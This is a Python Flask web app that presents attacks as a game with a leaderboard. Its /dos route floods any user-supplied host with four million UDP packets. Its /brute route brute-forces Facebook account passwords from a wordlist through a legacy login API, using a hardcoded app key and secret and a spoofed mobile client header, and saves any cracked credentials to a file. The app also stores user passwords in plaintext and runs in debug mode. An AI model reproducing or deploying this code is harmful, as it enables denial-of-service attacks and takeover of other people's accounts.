from flask import Flask, render_template, request, redirect, url_for, session, g
import socket
import sqlite3
import hashlib
import requests
from datetime import datetime
from flask_session import Session

app = Flask(__name__)
app.secret_key = 's3cr3t@mi4Hackings&'
app.config['SESSION_TYPE'] = 'filesystem'
Session(app)
app.database = "database.db"

def connect_db():
    return sqlite3.connect(app.database)

def create_tables():
    with connect_db() as conn:
        conn.execute('''CREATE TABLE IF NOT EXISTS users (
                            id INTEGER PRIMARY KEY AUTOINCREMENT,
                            username TEXT NOT NULL,
                            email TEXT NOT NULL,
                            password TEXT NOT NULL,
                            join_date TEXT NOT NULL,
                            games_played INTEGER DEFAULT 0
                        )''')
        conn.execute('''CREATE TABLE IF NOT EXISTS rankings (
                            id INTEGER PRIMARY KEY AUTOINCREMENT,
                            user_id INTEGER NOT NULL,
                            url TEXT NOT NULL,
                            FOREIGN KEY(user_id) REFERENCES users(id)
                        )''')
create_tables()

@app.before_request
def before_request():
    g.db = connect_db()

@app.teardown_request
def teardown_request(exception):
    if hasattr(g, 'db'):
        g.db.close()

@app.route('/')
def home():
    if 'user_id' in session:
        return redirect(url_for('profile'))
    return render_template('home.html')

@app.route('/signup', methods=['GET', 'POST'])
def signup():
    if request.method == 'POST':
        username = request.form['username']
        email = request.form['email']
        password = request.form['password']
        join_date = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

        g.db.execute('INSERT INTO users (username, email, password, join_date) VALUES (?, ?, ?, ?)',
                     [username, email, password, join_date])
        g.db.commit()

        print("User signed up successfully")
        return redirect(url_for('login'))
    return render_template('signup.html')

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        email = request.form.get('email')
        password = request.form.get('password')

        user = g.db.execute('SELECT * FROM users WHERE email = ? AND password = ?', [email, password]).fetchone()
        if user:
            session['user_id'] = user[0]
            session['username'] = user[1]
            session.permanent = True
            print("User logged in successfully")
            return redirect(url_for('profile'))
        else:
            print("Invalid credentials")
            return render_template('login.html', error='Invalid Email Or Password')
    return render_template('login.html')

@app.route('/profile')
def profile():
    if 'user_id' not in session:
        return redirect(url_for('home'))

    findIp = "https://api.ipify.org?format=json"
    send = requests.get(findIp)
    data = send.json()
    if data.get("ip"):
       ip = data.get("ip")
    else:
       ip = "127.0.0.1"

    user = g.db.execute('SELECT * FROM users WHERE id = ?', [session['user_id']]).fetchone()
    return render_template('profile.html', ip=ip, username=user[1], rank=user[5], joinDate=user[4], stage='Noob' if user[5] < 10 else 'Pro')

@app.route('/dos', methods=['GET', 'POST'])
def dos():
    if 'user_id' not in session:
        return redirect(url_for('home'))

    if request.method == 'POST':
        url = request.form['url']
        def clean(url):
            url = url.replace("http://", "")
            url = url.replace("https://", "")
            url = url.replace("www.", "")
            return url
        target = clean(url)
        ip = socket.gethostbyname(target)
        port = 8020
        joker = "\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n"
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        def send_packet():
            sock.sendto(bytes(joker, "UTF-8"), (ip, port))
            print(f"Sent packet to {target} at {ip}:{port}")
        sent = 0
        while True:
           sent += 1
           send_packet()
           if sent >= 4000000:
              break

        g.db.execute('INSERT INTO rankings (user_id, url) VALUES (?, ?)', [session['user_id'], url])
        g.db.execute('UPDATE users SET games_played = games_played + 1 WHERE id = ?', [session['user_id']])
        g.db.commit()
        dat = f"Sent 4000000 packets to {target} success"
        return render_template("dos.html", data=dat)

    return render_template('dos.html')

@app.route('/leaderboard')
def leaderboard():
    users = g.db.execute('SELECT id, username, games_played FROM users ORDER BY games_played DESC').fetchall()
    return render_template('leaderboard.html', users=users)
@app.route("/brute", methods=["POST","GET"])
def brute():
    if request.method == "POST":
       user = request.form.get("target")
       try:
          list = open("pass.txt", "r").readlines()
       except Exception as e:
          return render_template("brute.html", error=e)
       found = False
       for ps in list:
           ps = ps.strip()
           api_key = '882a8490361da98702bf97a021ddc14d'
           secret = '62f8ce9f74b12f84c123cc23437a4a32'
           req = {
               'api_key': api_key,
               'email': user,
               'password': ps,
               'format': 'json',
               'generate_session_cookies': 1,
               'locale': 'en_ZA',
               'method': 'auth.login',
           }
           sorted_req = sorted(req.items(), key=lambda x: x[0])
           sig = ''.join(f'{k}={v}' for k, v in sorted_req)
           ensig = hashlib.md5((sig + secret).encode()).hexdigest()
           req['sig'] = ensig
           api_url = 'https://api.facebook.com/restserver.php'
           headers = {'User-Agent': '[FBAN/FB4A;FBAV/35.0.0.48.273;FBDM/{density=1.33125,width=800,height=1205};FBLC/en_US;FBCR/;FBPN/com.facebook.katana;FBDV/Nexus 7;FBSV/4.1.1;FBBK/0;]'}
           reso = requests.post(api_url, data=req, headers=headers)
           resp = reso.json()
           resp = reso.json()
           g.db.execute('INSERT INTO rankings (user_id, user) VALUES (?, ?)', [session['user_id'], user])
           g.db.execute('UPDATE users SET games_played = games_played + 1 WHERE id = ?', [session['user_id']])
           g.db.commit()
           if 'access_token' in resp:
              pa = ps
              info = user
              save = open("0.txt","a").write(f"•[{user}]=[{ps}]•")
              return render_template("brute.html", info=info, pa=ps)

       if not found:
          error = "No matching password found."
          return render_template("brute.html", error=error)

    return render_template("brute.html")


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
